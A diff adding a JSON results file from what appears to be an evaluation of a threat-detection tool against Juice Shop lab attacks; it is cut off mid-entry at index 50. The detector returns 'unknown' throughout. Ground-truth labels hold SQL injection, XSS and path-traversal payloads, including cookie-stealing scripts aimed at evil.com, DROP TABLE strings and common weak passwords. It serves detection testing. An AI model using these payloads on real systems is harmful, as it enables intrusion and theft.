@@ -1,0 +1,2478 @@
+{
+  "timestamp": "2026-03-22T04:04:43.200383",
+  "results": [
+    {
+      "idx": 0,
+      "task_type": "data_exfiltration",
+      "task_id": "d1a50f25-0755-49b1-bd2e-24947fb8daf6",
+      "status": "completed",
+      "duration": 45.518245220184326,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' OR 1=1--",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 1,
+      "task_type": "data_exfiltration",
+      "task_id": "d328cd2e-8400-46d3-8d8f-397641ae3071",
+      "status": "completed",
+      "duration": 45.46312117576599,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin'--",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 2,
+      "task_type": "data_exfiltration",
+      "task_id": "91573c3e-605e-4cb6-af0a-8d7d3636504c",
+      "status": "completed",
+      "duration": 45.42869567871094,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' UNION SELECT 1,2,3--",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 3,
+      "task_type": "data_exfiltration",
+      "task_id": "f57fa992-ddc2-4cc2-aed2-4868ddbbe155",
+      "status": "completed",
+      "duration": 45.42092680931091,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' OR ''='",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 4,
+      "task_type": "data_exfiltration",
+      "task_id": "b65fea09-41e7-4862-80fb-2f0e5bf76eb3",
+      "status": "completed",
+      "duration": 75.55227160453796,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "') OR ('1'='1",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 5,
+      "task_type": "data_exfiltration",
+      "task_id": "3d9299f3-a7e4-4a19-8288-63db000fc5dd",
+      "status": "completed",
+      "duration": 90.61004519462585,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op'--",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 6,
+      "task_type": "data_exfiltration",
+      "task_id": "a7abf759-5fd1-4230-a18b-1971b1513dc3",
+      "status": "completed",
+      "duration": 105.68259763717651,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' OR 1=1; --",
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          80,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 7,
+      "task_type": "data_exfiltration",
+      "task_id": "7dfec0f6-82b3-429f-b431-ccef9dd9ccc2",
+      "status": "completed",
+      "duration": 75.61794805526733,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' OR 1=1--"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 8,
+      "task_type": "data_exfiltration",
+      "task_id": "1f34fb09-b750-4086-9482-f88f28d3cd48",
+      "status": "completed",
+      "duration": 75.56142687797546,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "'; DROP TABLE Products;--"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 9,
+      "task_type": "data_exfiltration",
+      "task_id": "33a032e6-2d98-43a4-ab6b-b901d5d2744d",
+      "status": "completed",
+      "duration": 75.7044084072113,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' UNION SELECT id,email,password,4,5,6,7,8,9 FROM "
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 10,
+      "task_type": "data_exfiltration",
+      "task_id": "1002bb30-267a-4e25-ad5a-b15957186e0e",
+      "status": "completed",
+      "duration": 90.68390536308289,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "')) OR 1=1--"
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 11,
+      "task_type": "data_exfiltration",
+      "task_id": "bf67babd-09e0-479c-8a06-e80acec76afd",
+      "status": "completed",
+      "duration": 45.42990970611572,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM "
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 12,
+      "task_type": "data_exfiltration",
+      "task_id": "aaf72f11-4a49-488a-a02e-7d0eb2d6f502",
+      "status": "completed",
+      "duration": 150.95292401313782,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "name,(CASE WHEN (1=1) THEN name ELSE price END)"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 13,
+      "task_type": "data_exfiltration",
+      "task_id": "f1fe339b-3531-4ad8-9a1c-a32a6835fcc0",
+      "status": "completed",
+      "duration": 135.82958674430847,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "name; DROP TABLE Users--"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 14,
+      "task_type": "data_exfiltration",
+      "task_id": "1458c602-a846-4397-a99d-e3ee26de17aa",
+      "status": "completed",
+      "duration": 136.0329978466034,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "price DESC, (SELECT password FROM Users LIMIT 1)"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "sqli",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 15,
+      "task_type": "phishing",
+      "task_id": "95f193b1-dcf3-4b04-84e0-55c0db66fefa",
+      "status": "completed",
+      "duration": 90.8342547416687,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<script>alert('XSS')</script>"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 16,
+      "task_type": "phishing",
+      "task_id": "717c5675-acb2-42ed-9341-a16e7125cdc2",
+      "status": "completed",
+      "duration": 45.46997809410095,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<img src=x onerror=alert(1)>"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 17,
+      "task_type": "phishing",
+      "task_id": "a3084cce-bd6e-4401-a33f-f9832759b06d",
+      "status": "completed",
+      "duration": 90.75258898735046,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<svg onload=alert(document.cookie)>"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 18,
+      "task_type": "phishing",
+      "task_id": "59745f6a-bc4b-434c-ac2f-71f8338d890d",
+      "status": "completed",
+      "duration": 75.63342833518982,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<iframe src='javascript:alert(1)'>"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 19,
+      "task_type": "phishing",
+      "task_id": "ce60944e-d788-4797-b5af-d09ff7d7a291",
+      "status": "completed",
+      "duration": 75.66786694526672,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "{{constructor.constructor('alert(1)')()}}"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 20,
+      "task_type": "phishing",
+      "task_id": "ad351534-d762-47d6-bf3c-c5833e52492b",
+      "status": "completed",
+      "duration": 90.77321887016296,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<body onload=alert('XSS')>"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 21,
+      "task_type": "phishing",
+      "task_id": "5d63d61e-cd9d-4202-9b83-4e23109bab5c",
+      "status": "completed",
+      "duration": 90.84078669548035,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "\"><script>document.location='http://evil.com/steal?c='+docum"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 22,
+      "task_type": "phishing",
+      "task_id": "000d2b4a-f720-4c57-b218-90d40ad6bbfe",
+      "status": "completed",
+      "duration": 90.76073980331421,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "<script>new Image().src='http://evil.com/'+document.cookie</"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 23,
+      "task_type": "phishing",
+      "task_id": "87ec84bc-4130-4d11-892b-4df79531c1f6",
+      "status": "completed",
+      "duration": 60.571964502334595,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "%3Cscript%3Ealert(1)%3C/script%3E"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 24,
+      "task_type": "phishing",
+      "task_id": "fe169c02-c8db-4062-9092-0e4341edf8d7",
+      "status": "completed",
+      "duration": 45.40270924568176,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "javascript:alert(document.domain)"
+        ],
+        "risk_range": [
+          60,
+          90
+        ],
+        "attack_type": "xss",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 25,
+      "task_type": "data_exfiltration",
+      "task_id": "706687bf-b8bf-478d-8532-aa903da549eb",
+      "status": "completed",
+      "duration": 75.5829074382782,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "package.json.bak"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 26,
+      "task_type": "data_exfiltration",
+      "task_id": "5774c78d-fb48-459c-b9f0-a608ff6c886c",
+      "status": "completed",
+      "duration": 75.49673652648926,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "/etc/passwd"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 27,
+      "task_type": "data_exfiltration",
+      "task_id": "fdafa991-fda6-43bb-af91-2fc730a3953a",
+      "status": "completed",
+      "duration": 90.62244248390198,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "eastere.gg"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 28,
+      "task_type": "data_exfiltration",
+      "task_id": "7bff2e24-78fc-4f1c-97f0-79a532d60da7",
+      "status": "completed",
+      "duration": 60.5412814617157,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "/api-docs"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 29,
+      "task_type": "data_exfiltration",
+      "task_id": "99b81acc-090d-43b5-88da-a0a380c1ddbd",
+      "status": "completed",
+      "duration": 75.63587069511414,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "/encryptionkeys"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 30,
+      "task_type": "data_exfiltration",
+      "task_id": "36be1546-0437-4183-99ee-deeae4821c8d",
+      "status": "completed",
+      "duration": 60.566757678985596,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "acquisitions.md"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 31,
+      "task_type": "data_exfiltration",
+      "task_id": "dffc5c6a-2d65-41ea-b74a-becb18ca7f7f",
+      "status": "completed",
+      "duration": 75.57661271095276,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "quarantine"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 32,
+      "task_type": "data_exfiltration",
+      "task_id": "f828bda3-0a6f-41dd-9ac1-893d9a574d35",
+      "status": "completed",
+      "duration": 90.59802556037903,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "security.txt"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 33,
+      "task_type": "data_exfiltration",
+      "task_id": "424da221-1410-46dd-86f0-5e2c7031d5d6",
+      "status": "completed",
+      "duration": 75.64486241340637,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "suspicious_errors.yml"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 34,
+      "task_type": "data_exfiltration",
+      "task_id": "104ac34c-7c49-4de9-bd3d-a2a7a32dac44",
+      "status": "completed",
+      "duration": 75.54257464408875,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "package.json"
+        ],
+        "risk_range": [
+          50,
+          85
+        ],
+        "attack_type": "path_traversal",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 35,
+      "task_type": "brute_force",
+      "task_id": "b25360df-c52b-4853-b724-246cc8efcd3a",
+      "status": "completed",
+      "duration": 120.890634059906,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op",
+          "admin123"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 36,
+      "task_type": "brute_force",
+      "task_id": "f2e95fb9-b230-4976-9d7a-a7331433d13d",
+      "status": "completed",
+      "duration": 105.80394625663757,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op",
+          "password"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 37,
+      "task_type": "brute_force",
+      "task_id": "c940b785-6401-4aa1-a8b5-f99b0ea96a3f",
+      "status": "completed",
+      "duration": 60.60931587219238,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op",
+          "123456"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 38,
+      "task_type": "brute_force",
+      "task_id": "a440cfd8-92f6-485d-b3d3-773daffbb96f",
+      "status": "completed",
+      "duration": 45.49098587036133,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op",
+          "admin"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 39,
+      "task_type": "brute_force",
+      "task_id": "589eadc4-b903-4224-a26b-78f10ed5f281",
+      "status": "completed",
+      "duration": 45.4094352722168,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op",
+          "letmein"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 40,
+      "task_type": "brute_force",
+      "task_id": "c41c7b02-cda4-4a32-ac4c-62492c018101",
+      "status": "completed",
+      "duration": 90.76800537109375,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJp..."
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 41,
+      "task_type": "brute_force",
+      "task_id": "89d76b90-7691-4972-b6a8-bb6294d0a3b2",
+      "status": "completed",
+      "duration": 105.79913759231567,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..."
+        ],
+        "risk_range": [
+          75,
+          100
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 42,
+      "task_type": "brute_force",
+      "task_id": "d798c59b-f8c4-431a-8369-7e63f4760e4e",
+      "status": "completed",
+      "duration": 60.43259859085083,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "admin@juice-sh.op"
+        ],
+        "risk_range": [
+          65,
+          90
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "medium"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 43,
+      "task_type": "brute_force",
+      "task_id": "65e2a37e-4d7f-41f7-8ca1-2c9a087e7780",
+      "status": "completed",
+      "duration": 45.38966178894043,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "jim@juice-sh.op"
+        ],
+        "risk_range": [
+          65,
+          90
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 44,
+      "task_type": "brute_force",
+      "task_id": "4fff4878-0662-4c02-b7a2-3bcb3254f86f",
+      "status": "completed",
+      "duration": 151.04252982139587,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "evil@attacker.com",
+          "role:admin"
+        ],
+        "risk_range": [
+          70,
+          95
+        ],
+        "attack_type": "broken_auth",
+        "difficulty": "hard"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 50,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 45,
+      "task_type": "data_exfiltration",
+      "task_id": "9abcc4a4-e8bb-4945-b50c-3889b8e84bde",
+      "status": "completed",
+      "duration": 75.61822772026062,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "basket_id:1"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 46,
+      "task_type": "data_exfiltration",
+      "task_id": "d8b447e0-f99b-4702-9a25-d7e01fdc06ea",
+      "status": "completed",
+      "duration": 75.6287350654602,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "basket_id:2"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 47,
+      "task_type": "data_exfiltration",
+      "task_id": "1d8535a3-44b7-4824-a7d2-eb1f2e55a652",
+      "status": "completed",
+      "duration": 75.62618279457092,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "basket_id:3"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 48,
+      "task_type": "data_exfiltration",
+      "task_id": "07df3bbb-5bf5-4ea2-94bb-6d1fc8f3d938",
+      "status": "completed",
+      "duration": 75.56377387046814,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "basket_id:4"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 49,
+      "task_type": "data_exfiltration",
+      "task_id": "2de52af2-81c8-42dd-86c9-b542976ccafd",
+      "status": "completed",
+      "duration": 75.46718525886536,
+      "ground_truth": {
+        "verdict": "true_positive",
+        "expected_iocs": [
+          "basket_id:5"
+        ],
+        "risk_range": [
+          50,
+          80
+        ],
+        "attack_type": "idor",
+        "difficulty": "easy"
+      },
+      "actual_verdict": "unknown",
+      "actual_risk_score": 45,
+      "actual_iocs": [
+        "domains",
+        "hashes",
+        "ips"
+      ],
+      "model_used": "unknown"
+    },
+    {
+      "idx": 50,
+      "task_type": "data_exfiltration",
+      "task_id": "d3ff420a-e8ce-42a8-8ce8-20eb02666b26",
+      "status": "completed",
